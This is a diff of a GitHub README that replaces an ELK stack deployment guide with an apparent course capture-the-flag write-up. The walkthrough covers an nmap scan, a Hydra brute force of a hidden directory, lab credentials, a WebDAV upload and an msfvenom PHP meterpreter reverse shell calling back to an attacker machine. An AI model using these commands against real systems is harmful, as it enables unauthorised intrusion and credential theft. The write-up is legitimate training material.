@@ -1,143 +1,124 @@
-﻿## Automated ELK Stack Deployment
+﻿##Red Team 
 
-The files in this repository were used to configure the network depicted below.
+###Step 1: Discovering the IP address of the linux server.
+
+In order to find the ip address of the machine, we will need to use a network mapping tool called Nmap to scan the network. 
+
+- Open the terminal and run: nmap 192.168.1.0/24 (We used this ip cidr range bcause our attack machine belongs to this subnetwork.)
 
 ![alt text](https://github.com/cyberprotocols/cyberpro_inc/blob/main/Diagrams/Virtual_Network_Map.JPG)
 
-These files have been tested and used to generate a live ELK deployment on Azure. They can be used to either recreate the entire deployment pictured above. Alternatively, select portions of the filebeat-playbook.yml file may be used to install only certain pieces of it, such as Filebeat.
-- install-elk.yml 
-- filebeat-playbook.yml
-- metricbeat-playbook.yml 
+From the Nmap scan we can see that port 80 is open. Next we opened a web browser and typed the IP address of the machine into the address bar.
 
-This document contains the following details:
-- Description of the Topology
-- Access Policies
-- ELK Configuration
-  - Beats in Use
-  - Machines Being Monitored
-- How to Use the Ansible Build
+-Open web browser and navigate to 192.168.1.105 and press enter. 
+![alt text](https://github.com/cyberprotocols/cyberpro_inc/blob/main/Diagrams/Virtual_Network_Map.JPG)
 
 
-### Description of the Topology
 
-The main purpose of this network is to expose a load-balanced and monitored instance of DVWA, the D*mn Vulnerable Web Application.
+###Step 2: Locating the hidden directory on the server.
 
-Load balancing ensures that the application will be highly available and redundent, in addition to restricting unwanted traffic to the network.
--Load Balancers offers off-loading function defending an organization against distributed denial-of-service (DDoS) attacks. 
--Software load balancers with cloud offload provide efficient perimeter firewall functionalities at an efficient and cost effictive solution. 
+- We navigated through different directories, we noticed reocurring messages:
 
--A JumpBox server is a hardened and monitored device that spans two dissimilar security zones and provides a controlled means of access between them. 
--The JumpBox server acts as a single audit point for traffic and also a single place where user accounts can be managed. 
--It streamlines maitainance since its maintained on a single system. Therefore, when an update to the SAN management software is available, only one single 
-system is requiered. 
+![alt text](https://github.com/cyberprotocols/cyberpro_inc/blob/main/Diagrams/Virtual_Network_Map.JPG)
 
-Integrating an ELK server allows users to easily monitor the vulnerable VMs for changes to the system logging and system Services.
-- Filebeat is a lightweight shipper that forwards and centralizes log data. 
-- Filebeat inputs looks in the location you've specified for log data. For each log that filebeat locates, filebeat starts a harvester. 
-- Metricbeat is a lightweight shipper that is install on the elk server to collect metrics from the OS and from services running on the server.
-- Metricbeat takes the metrics and statistics that it collects and ships them out to the output that yoou specify, such as Elasticsearch or logstash.
+- Upon such discovery we navigated to the directory by typing: 192.168.1.105/company_folders/secret_folder
 
-The configuration details of each machine may be found below.
-| Name     | Function | IP Address | Operating System |
-|----------|----------|------------|------------------|
-| Jump Box | Gateway  | 10.0.0.4   | Linux            |
-| Web-1    | webserver| 10.0.0.5   | Linux            |
-| Web-2    |webserver2| 10.0.0.6   | Linux            |
-|Elk-Server| ElkDocker| 10.1.0.4   | Linux/Docker     |
+- The directory asked us for authentication in order to access it. Reading the authentication method, it says "For ashton's eyes only"
 
-### Access Policies
+![alt text](https://github.com/cyberprotocols/cyberpro_inc/blob/main/Diagrams/Virtual_Network_Map.JPG)
 
-The machines on the internal network are not exposed to the public Internet. 
+- We then went back to the web browser and use the credential to log in. We clicked the file connecting_to_webdav
 
-Only the JumpBox machine can accept connections from the Internet. Access to this machine is only allowed from the following IP addresses:
-- 98.252.34.13
+![alt text](https://github.com/cyberprotocols/cyberpro_inc/blob/main/Diagrams/Virtual_Network_Map.JPG)
 
-Machines within the network can only be accessed by Jumpbox .
-- JumpBox 10.0.0.4
 
-A summary of the access policies in place can be found in the table below.
+### Step 3: Brute force the password for the hidden directory.
 
-| Name     | Publicly Accessible | Allowed IP Addresses |
-|----------|---------------------|----------------------|
-| Jump Box | Yes                 | 98.252.34.13 13.82.149.52         |
-| elkserver| yes                 | 10.0.0.4             |
-|          |                     |                      |
+Because the folder is password protected, we need to either guess the password or brute force into the directory. In this case, it would be much more efficient
+to use a brute force attack, specifically Hydra. 
 
-### Elk Configuration
+- Using Ashton's name, run the Hydra attack against the directory: 
 
-Ansible was used to automate configuration of the ELK machine. No configuration was performed manually, which is advantageous because
-It's a free open source tool that is simple to set up and use. It's poweful yet flexible way to model and automate complex IT workflows.
- 
-In this case ansible allowed us to easily deploy our elk machine without the need to write custom code, all by listing the tasks required
-to be done by just writing a playbook. Ansible was able to figure our how to get the system to the state we wanted to be in. This can be
-very easily repeated with the ansible playbook. Allowing constant and congruent deployment.
+   - type: hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder
 
-The playbook implements the following tasks:
-- Set the vm.max_count to 262144 *This configures the machine being configured to use more memory.
-Also sysctl module and configure it so that the setting is automatically run if the VM has been
-restarted.
-- install apt packages:
-	a. docker.io: The Docker engine, used for running containers.
-	b. Python3-pip: Package used to install python software. 
-- install the following pip packages:
-	a. docker python client for docker. Required by Ansible to control the state of docker containers. 
-- Download the docker container:
-	a. sebp/elk:761
--Configure the container to start with the following port mapping:
-	a. 5601:5601
-	b. 9200:9200
-	c. 5044:5044
+![alt text](https://github.com/cyberprotocols/cyberpro_inc/blob/main/Diagrams/Virtual_Network_Map.JPG)
 
-The following screenshot displays the result of running `docker ps` after successfully configuring the ELK instance.
+- The brute force attack may take some time. Once it finished, the username is ashton and the password is leopoldo.
+
+![alt text](https://github.com/cyberprotocols/cyberpro_inc/blob/main/Diagrams/Virtual_Network_Map.JPG)
+
+-We went back to the web browser and used the credentiial to log in. We open the file connecting_to_webdav file.  
+
+![alt text](https://github.com/cyberprotocols/cyberpro_inc/blob/main/Diagrams/Virtual_Network_Map.JPG)
+
+- Located inside of the WebDAV file are instructions on how to connect to the WebDAV directory, as well the user's username and hashed password.
+
+![alt text](https://github.com/cyberprotocols/cyberpro_inc/blob/main/Diagrams/Virtual_Network_Map.JPG)
+
+
+### Step 4: Connect to the server via Webdav 
+
+There are several ways to break the password hash. But in this intanse we avoided waiting for john to crack the password hash, we used https://crackstation.net
+paste the password hash and filled out the CAPTCHA; and clicked Crack Hashes. 
 
 ![alt text](https://github.com/cyberprotocols/cyberpro_inc/blob/main/Ansible/docker_ps_screenshot.png)
 
-### Target Machines & Beats
-This ELK server is configured to monitor the following machines:
-- Web-Server1 10.0.0.5 
-- Web-Server2 10.0.0.6
+- The password is revealed as: linux4u
 
-We have installed the following Beats on these machines:
-- Web-Server1 10.0.0.5 
-- Web-Server2 10.0.0.6
+### Step 5: Connecting to the server via WebDAV.
 
-These Beats allow us to collect the following information from each machine:
-- periodically collect metrics from the operating system and from services running on the server. Metricbeat takes the metrics and statistics that it collects and ships them to the output that you specify, such as Elasticsearch or Logstash.
-  Metricbeat helps you monitor your servers by collecting metrics from the system and services running on the server, such as:
-	1.Apache
-	2.HAProxy
-	3.MongoDB
-	4.MySQL
-	5.Nginx
-	6.PostgreSQL
-	7.Redis
-	8.System
-	9.Zookeeper
-Beat will collect logs which we use to track user logon events, etc. We are also collecting network data and Linux audit framework data.
+- We gained important information to make the WebDAV connection on our local attack machine. We used that information by:
+	
+	- We opened the file system shortcut from the desktop.
+	
+	- Clicked on Browse Network.
 
-### Using the Playbook
-In order to use the playbook, you will need to have an Anscible control node already configured. Assuming you have such a control node provisioned: 
+	- In the URL bar, typed: dav://192.168.1.105/webdav, and entered the credentials to log in.
 
-SSH into the control node and follow the steps below:
-- Copy the filebeat configuration file to Web-vms where we installed filebeat.
-/etc/filebeat/filebeat.yml
-- Update the filebeat-playbook to include:
-a Download the .deb file from artifacts.elastic.com
-b Run filebeat modules enable system
-c filebeat setup
-d service metricbeat start
+![alt text](https://github.com/cyberprotocols/cyberpro_inc/blob/main/Ansible/docker_ps_screenshot.png)
 
-- Run the playbook, and navigate to the filebeat installation page on the ELK serve GUI. 
-a Verify that the playbook is completing step 1-4 
-b on the same page, scroll to step 5: Module status and click check data.
-C scroll to the bottom and click on verify data. 
-D if the ELK stack was successfully receiving logs, you would have seen:
-‘data successfully received from this module.  
 
-- Filebeat-playbook. They are located in /etc/filebeat/filebeat.yml
+### Step 6: Creating and Uploading a PHP reverse shell payload.
 
-- To run Ansible in a specific machine, we need to edit the host file first and create a specific group. To install ELK in a specific machine, edit the install-elk.yml file. Under host specify the elk server that was created in the host file. This will prevent the elk server installation in unwanted machines. Likewise in the filebeat-playbook.yml file, under the hosts: specify the targeted hosts, which was created in the hosts file. 
+- To set up the reverse shell, run:
+	- msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 >> shell.php
 
-- To check that the ELK server is running open your browser and navigate to http://13.83.48.12:5601//app/kibana. 
+- The series of command above does the following :
+
+	- msfconsole to launch msfconsole.
+
+	- use exploit/multi/handler
+	
+	- set payload php/meterpreter/reverse_tcp
+
+	- show options and point out they need to set the LHOST
+
+	- set LHOST 192.168.1.90(Attacker Machine)
+
+	- exploit  
+
+- Placed the reverse shell onto the webDAV directory
+
+- We logged back in, visited the webdav folder by navigating to 192.168.1.105/webdav. Used the credentials obtained before, user:ryan pass:linux4u
+
+- I visited where i uploaded the reverse shell and clicked it to activate it. (If it seems like tge browser is hanging or loading, that means it has worked.)
+
+![alt text](https://github.com/cyberprotocols/cyberpro_inc/blob/main/Ansible/docker_ps_screenshot.png)
+
+### Step 7: Find and capture the flag. 
+
+- on the listener, we are going to search for the file flag.txt located in the root directory. To do such i did the following:
+
+	- Dropped a bash shell with the command: shell
+
+	- Changed directory to the / directory: cd /
+
+	- Searched the system for any files containing the phrase "flag" : find . -iname flag.txt
+
+- Printed the file once i located it by: cat flag.txt
+
+![alt text](https://github.com/cyberprotocols/cyberpro_inc/blob/main/Ansible/docker_ps_screenshot.png)
+
+![alt text](https://github.com/cyberprotocols/cyberpro_inc/blob/main/Ansible/docker_ps_screenshot.png)
 
 
